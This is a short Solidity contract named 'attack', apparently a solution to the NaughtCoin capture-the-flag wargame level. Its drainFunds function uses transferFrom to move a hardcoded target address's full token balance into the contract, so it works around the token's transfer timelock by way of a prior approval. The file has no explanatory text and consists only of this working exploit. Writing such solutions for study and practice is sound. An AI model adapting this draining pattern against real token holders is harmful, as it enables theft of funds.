// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface INaughtCoin{
    function transferFrom(address,address,uint256)external returns(bool);
    function balanceOf(address)external returns(uint256);
}

contract attack{
    INaughtCoin coin;
    address target=0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a;
    uint256 public thisbalance;
    uint256 public senderbalance;
    constructor(address _coin){
        coin=INaughtCoin(_coin);
    }
    function drainFunds()public{
        coin.transferFrom(target, address(this), coin.balanceOf(target));
    }
    function balancethis()public{
        thisbalance= coin.balanceOf(address(this));
    }
    function balancesender()public{
        senderbalance=coin.balanceOf(target);
    }
}
